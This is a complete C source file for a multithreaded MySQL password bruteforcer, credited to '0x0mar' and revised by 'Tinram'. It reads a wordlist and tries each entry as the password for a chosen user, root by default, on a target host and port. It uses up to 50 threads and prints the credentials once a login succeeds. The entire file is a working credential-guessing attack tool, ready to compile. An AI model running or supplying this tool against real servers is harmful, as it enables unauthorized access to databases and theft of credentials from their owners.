
/**
	* MySQL Bruteforcer
	*
	* @author        0x0mar
	*                revised by Tinram
	*
	* compile:       gcc mysql.c $(mysql_config --cflags) $(mysql_config --libs) -o mysql -Ofast -Wall -Wextra -Wuninitialized -Wunused -Werror -std=gnu99 -s
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <sys/sysinfo.h>
#include <getopt.h>
#include <pthread.h>
#include <mysql/mysql.h>

#define VERSION "0.02"
#define MAX_WORD_LEN 50

unsigned int verbose = 0;
volatile unsigned int wordCount = 0;
volatile unsigned int passwordFound = 0;
char *progName = NULL;
FILE *wordList;

pthread_mutex_t mutex_pass = PTHREAD_MUTEX_INITIALIZER;

struct args {
	char *host;
	char *username;
	char *filename;
	int port;
	int threads;
};

void showMenu(char *progName) {
	fprintf(stdout, "\nMySQL Bruteforcer v.%s\nby 0x0mar, revised by Tinram", VERSION);
	fprintf(stdout, "\n\nUsage:\n");
	fprintf(stdout, "\t%s -h <host> -u <user> -f <file> [-t <num_threads>] [-p <port>] [-v]\n\n", progName);
}

unsigned int konnect(char *hostname, char *username, char *password, int port) {

	MYSQL *conn;
	conn = mysql_init(NULL);

	if ( ! mysql_real_connect(conn, hostname, username, password, NULL, port, NULL, 0)) {

		switch (mysql_errno(conn)) {
			case 1045: /* ER_ACCESS_DENIED_ERROR */
				if (verbose >= 1) {
					printf("failed: %d %s\n", mysql_errno(conn), mysql_error(conn));
				}
				break;
			default:
				printf("error: %d -> %s\n",  mysql_errno(conn),  mysql_error(conn));
				break;
		}
		return 0;
	}
	
	if (verbose >= 1) {
		printf("success: %d %s\n", mysql_errno(conn), mysql_error(conn));
	}

	mysql_close(conn);
	return 1;
}

unsigned int getpassword(char **buf, size_t *buflen, char **username, char **password, char *word) {

	pthread_mutex_lock(&mutex_pass);

	if (getline(buf, buflen, wordList) >= 0) {

		wordCount++;
		pthread_mutex_unlock(&mutex_pass);
		size_t idx = strcspn(*buf, "\r\n"); /* strip EOL, thanks Tim Čas */
		strncpy(word, *buf, idx);
		word[idx] = '\0';
		*password = word;

		if (wordCount % 1000 == 0) {
			fprintf(stdout, "line: %u\r", wordCount);
			fflush(stdout);
		}

		if (verbose >= 2) {
			printf("username: %s password: %s\n", *username, *password);
		}

		return 1;
	}

	pthread_mutex_unlock(&mutex_pass);
	return 0;
}

void *search(void *p) {

	struct args *a = (struct args *) p;
	char *buf = 0;
	size_t buflen = 0;
	char *user = a->username;
	char *pass = NULL;
	char word[MAX_WORD_LEN];

	while (passwordFound == 0) {

		if (getpassword(&buf, &buflen, &user, &pass, word) == 0) {
			goto free; /* end of wordfile */
		}

		if (konnect(a->host, user, pass, a->port)) {
			printf("\n\nfound!\nusername: %s\npassword: %s\n", user, pass);
			passwordFound = 1;
			goto free;
		}
	}

	free:
	if (buf != NULL) {
		free(buf);
	}

	pthread_exit(NULL);
	return NULL;
}

int main(int argc, char **argv) {

	if (argc < 3) {
		showMenu(argv[0]);
		return EXIT_FAILURE;
	}

	struct args args;
	pthread_t *thd;
	pthread_attr_t attr;
	unsigned int nthreads = 1;
	clock_t start;
	clock_t diff;
	int c;
	int msec;

	memset(&args, 0, sizeof(args));

	while ( (c = getopt(argc, argv, "h:u:f:t:p:v")) != -1) {

		switch (c) {

			case 'h':
				args.host = optarg;
				break;

			case 'u':
				args.username = optarg;
				break;

			case 'f':
				args.filename = optarg;
				break;

			case 't':
				args.threads = atoi(optarg);
				break;

			case 'p':
				args.port = atoi(optarg);
				break;

			case 'v':
				verbose++;
				break;
		}
	}

	if (args.host == NULL) {
		args.host = "localhost";
	}

	if (args.username == NULL) {
		args.username = "root";
	}

	if (args.port <= 0) {
		args.port = 3306;
	}

	if (args.threads <= 0) {
		nthreads = (unsigned int) get_nprocs();
	}
	else if (args.threads > 50) {
		nthreads = 50;
	}
	else {
		nthreads = args.threads;
	}

	if (verbose >= 1) {
		printf("\nnumber threads: %u\n", nthreads);
		printf("port: %u\n\n", args.port);
	}

	start = clock();

	wordList = fopen(args.filename, "r");
	if (wordList == NULL) {
		fprintf(stderr, "\nerror in trying to read wordlist file\n\n");
		return EXIT_FAILURE;
	}

	thd = malloc(nthreads * sizeof(*thd));
	if ( ! thd) {
		perror("malloc");
		exit(EXIT_FAILURE);
	}
	
	mysql_library_init(0, NULL, NULL);

	if (pthread_attr_init(&attr) != 0) {
		perror("pthread_attr_init");
		exit(EXIT_FAILURE);
	}

	if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE) != 0) {
		perror("pthread_attr_setdetachstate");
		exit(EXIT_FAILURE);
	}

	for (unsigned i = 0; i < nthreads; i++) {
		if (pthread_create(&thd[i], NULL, search, &args) != 0) {
			perror("pthread_create");
			exit(EXIT_FAILURE);
		}
	}

	for (unsigned i = 0; i < nthreads; i++) {
		if (pthread_join(thd[i], NULL) != 0) {
			perror("pthread_join");
			exit(EXIT_FAILURE);
		}
	}

	pthread_attr_destroy(&attr);

	free(thd);

	mysql_library_end();

	fclose(wordList);

	if ( ! passwordFound) {
		fprintf(stdout, "\nno word match\n");
	}

	fprintf(stdout, "\nwords parsed: %u\n", wordCount);

	/* timer display, by Ben Alpert; only accurate in this context for localhost connection */
	diff = clock() - start;
	msec = diff * 1000 / CLOCKS_PER_SEC;
	fprintf(stdout, "parse time: %d s %d ms\n\n", msec / 1000, msec % 1000);

	return EXIT_SUCCESS;
}
